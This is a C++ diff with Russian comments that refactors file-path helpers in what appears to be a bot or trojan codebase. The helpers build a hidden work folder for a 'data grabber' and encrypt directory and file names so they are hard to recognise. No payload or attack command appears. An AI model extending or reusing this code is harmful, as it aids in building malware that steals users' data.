@@ -107,6 +107,7 @@ namespace BOT
 {
 	PCHAR  MakeWorkFolder(); // Функция возвращает имя рабочего каталога бота
 	string MakeWorkPath();   // Функция генерирует полный рабочий путь
+	string MakePath(const char* SubDirectory); // Функция генерирует имя пути в рабочем каталоге
 }
 
 
@@ -163,6 +164,41 @@ string BOT::MakeWorkPath()
     }
 	return Result;
 }
+
+
+//-------------------------------------------
+// Функция собирает путь с указанной поддиректорией
+// ВАЖНО:
+// Функция не поддерживает вложенные поддиректории.
+// ДЛя обеспечения уникальности, имя директории шифруется
+//-------------------------------------------
+string BOT::MakePath(const char* SubDirectory)
+{
+	string Path = BOT::WorkPath();
+
+	if (!STRA::IsEmpty(SubDirectory))
+	{
+		if (SubDirectory[0] == SlashChar)
+			SubDirectory++;
+
+		string Temp = SubDirectory;
+
+		if (Temp[Temp.Length() - 1] == SlashChar)
+			Temp[Temp.Length() - 1] = 0;
+
+		PCHAR SD = UIDCrypt::CryptFileName(Temp.t_str(), false);
+
+		Path += SD;
+		Path += Slash;
+
+		STR::Free(SD);
+
+		if (!DirExists(Path.t_str()))
+			pCreateDirectoryA(Path.t_str(), NULL);
+    }
+	return Path;
+}
+
 //----------------------------------------------------------------------------
 
 
@@ -178,6 +214,34 @@ string BOT::WorkPath()
 		BotData->WorkPath = MakeWorkPath();
 	return BotData->WorkPath;
 }
+
+
+//-------------------------------------------
+// MakeFileName - Функция генерирует имя фала
+//                Имена поддиректории и файла
+//                шифруются уидом
+//-------------------------------------------
+string BOT::MakeFileName(const char* SubDir, const char* FileName)
+{
+	// Функция собирает имя файла в рабочей папке бота
+	string Name = MakePath(SubDir);
+
+	// Шифруем имя файла
+	if (!STRA::IsEmpty(FileName))
+	{
+		PCHAR Tmp = UIDCrypt::CryptFileName(FileName, false);
+		Name += Tmp;
+		STR::Free(Tmp);
+    }
+
+	return Name;
+}
+
+string BOT::MakeFileName(const string &SubDir, const string &FileName)
+{
+	return MakeFileName(SubDir.t_str(), FileName.t_str());
+}
+
 
 
 
@@ -246,48 +310,11 @@ string TBotApplication::ApplicationName()
 }
 //-------------------------------------------------------------
 
-
-string TBotApplication::MakePath(const char* SubDirectory)
-{
-	// Функция собирает путь с указанной поддиректорией
-	// ВАЖНО:
-	// Функция не поддерживает вложенные поддиректории.
-	// ДЛя обеспечения уникальности, имя директории шифруется
-
-	string Path = BOT::WorkPath();
-
-	if (!STRA::IsEmpty(SubDirectory))
-	{
-		if (SubDirectory[0] == SlashChar)
-			SubDirectory++;
-
-		string Temp = SubDirectory;
-
-		if (Temp[Temp.Length() - 1] == SlashChar)
-			Temp[Temp.Length() - 1] = 0;
-
-		PCHAR SD = UIDCrypt::CryptFileName(Temp.t_str(), false);
-
-		Path += SD;
-		Path += Slash;
-
-		STR::Free(SD);
-
-		if (!DirExists(Path.t_str()))
-			pCreateDirectoryA(Path.t_str(), NULL);
-    }
-	return Path;
-}
-
-string TBotApplication::MakePath(const string &SubDirectory)
-{
-	return MakePath(SubDirectory.t_str());
-}
 //-------------------------------------------------------------
 
 string TBotApplication::CreateFile(const char* SubDir, const char* FileName)
 {
-	string Name = MakeFileName(SubDir, FileName);
+	string Name = BOT::MakeFileName(SubDir, FileName);
 	File::WriteBufferA(Name.t_str(), NULL, 0);
 	return Name;
 }
@@ -300,32 +327,11 @@ string TBotApplication::CreateFile(const string &SubDir, const char* FileName)
 
 //-------------------------------------------------------------
 
-string TBotApplication::MakeFileName(const char* SubDir, const char* FileName)
-{
-	// Функция собирает имя файла в рабочей папке бота
-	string Name = MakePath(SubDir);
-
-	// Шифруем имя файла
-	if (!STRA::IsEmpty(FileName))
-	{
-		PCHAR Tmp = UIDCrypt::CryptFileName(FileName, false);
-		Name += Tmp;
-		STR::Free(Tmp);
-    }
-
-	return Name;
-}
-
-string TBotApplication::MakeFileName(const string &SubDir, const char* FileName)
-{
-	return MakeFileName(SubDir.t_str(), FileName);
-}
-//-------------------------------------------------------------
 
 bool TBotApplication::FileExists(const char* SubDir, const char* FileName)
 {
 	// Функция проверяет наличие файла в рабочей папке бота
-	string Name = MakeFileName(SubDir, FileName);
+	string Name = BOT::MakeFileName(SubDir, FileName);
 	return File::IsExists(Name.t_str());
 }
 
@@ -339,7 +345,7 @@ string TBotApplication::GrabberPath()
 {
 	// Путь к рабочему каталогу грабера данных
 	if (FGrabberPath.IsEmpty())
-		FGrabberPath = MakePath(GetStr(StrGrabberPath));
+		FGrabberPath = BOT::MakePath(GetStr(StrGrabberPath).t_str());
 	return FGrabberPath;
 }
 //-------------------------------------------------------------
@@ -348,7 +354,7 @@ string TBotApplication::PrefixFileName()
 {
 	// Функция возвращает имя файла для хранения префикса
 	if (FPerfixFileName.IsEmpty())
-		FPerfixFileName = MakeFileName(NULL, GetStr(EStrPrefixFileName).t_str());
+		FPerfixFileName = BOT::MakeFileName(NULL, GetStr(EStrPrefixFileName).t_str());
 
 	return FPerfixFileName;
 }
@@ -1196,7 +1202,7 @@ void BOT::DeleteSettings()
 //----------------------------------------------------
 void BOT::SavePrefixToTemporaryFile()
 {
-	string FileName = Bot->MakeFileName(NULL, GetStr(EStrTemporaryPrefixFileName).t_str());
+	string FileName = MakeFileName(NULL, GetStr(EStrTemporaryPrefixFileName).t_str());
 	SavePrefixToFile(FileName.t_str());
 }
 //----------------------------------------------------------------------------
@@ -1207,7 +1213,7 @@ void BOT::SavePrefixToTemporaryFile()
 //----------------------------------------------------
 void BOT::SavePrefixFromTemporaryFile(bool IgnoreIfExists)
 {
-	string TempName   = Bot->MakeFileName(NULL, GetStr(EStrTemporaryPrefixFileName).t_str());
+	string TempName   = MakeFileName(NULL, GetStr(EStrTemporaryPrefixFileName).t_str());
 	if (File::IsExists(TempName.t_str()))
 	{
 		
